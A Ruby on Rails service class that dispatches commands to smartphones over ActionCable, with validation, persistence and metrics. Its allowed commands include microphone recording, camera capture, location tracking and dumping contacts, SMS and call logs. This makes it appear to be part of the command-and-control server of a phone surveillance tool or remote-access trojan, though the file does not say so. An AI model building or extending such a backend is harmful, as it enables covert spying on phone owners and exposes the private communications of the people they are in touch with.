# frozen_string_literal: true

# Single-responsibility service for command execution.
# Pipeline: validate → create → broadcast → track
class CommandExecutionService
  include ServiceInterface
  include DependencyInjectable

  dependency :broadcaster,  default: -> { ActionCable.server }
  dependency :validator,    default: -> { InputValidator }
  dependency :logger,       default: -> { StructuredLogger }
  dependency :metrics,      default: -> { MetricsService }

  VALID_COMMANDS = %w[
    take_screenshot location mic_record camera_capture
    get_device_info start_camera stop_camera get_wifi_info
    get_localtime dump_contacts dump_sms dump_calllogs
  ].freeze

  def initialize(smartphone:, command:, params: {}, **deps)
    @smartphone = smartphone
    @command = command.to_s
    @params = params
    inject_dependencies(deps)
  end

  def call
    # 1. Validate
    validation = validate
    return validation if validation.failure?

    # 2. Create pending command
    pending_command = create_pending_command
    return failure("Failed to create pending command") unless pending_command.persisted?

    # 3. Broadcast to device via ActionCable
    broadcast_command(pending_command)

    # 4. Track
    track_execution(pending_command)

    logger.info("Command executed",
      device_id: @smartphone.device_id,
      command: @command,
      request_id: pending_command.request_id
    )

    success(pending_command)
  end

  private

  def validate
    return failure("Smartphone is required") if @smartphone.nil?
    return failure("Device not connected") unless @smartphone.device_id.present?
    return failure("Invalid command: #{@command}") unless VALID_COMMANDS.include?(@command)

    if validator.respond_to?(:validate_command_params)
      errors = validator.validate_command_params(@command, @params)
      return failure("Invalid params: #{errors.join(', ')}") if errors.present?
    end

    success(:valid)
  end

  def create_pending_command
    PendingCommand.create!(
      smartphone: @smartphone,
      command: @command,
      params: @params,
      status: 'pending',
      request_id: SecureRandom.uuid
    )
  rescue ActiveRecord::RecordInvalid => e
    logger.error("PendingCommand creation failed", error: e, device_id: @smartphone.device_id)
    nil
  end

  def broadcast_command(pending_command)
    channel = "device_#{@smartphone.device_id}"
    payload = {
      command: @command,
      params: @params,
      request_id: pending_command.request_id
    }

    broadcaster.broadcast(channel, payload)
  rescue StandardError => e
    logger.warn("Broadcast failed, command queued for retry",
      error: e, device_id: @smartphone.device_id)
  end

  def track_execution(pending_command)
    metrics.increment("commands_executed_total",
      labels: { command: @command, device: @smartphone.device_id })
  rescue StandardError
    # Metrics failures must not break the flow
  end
end
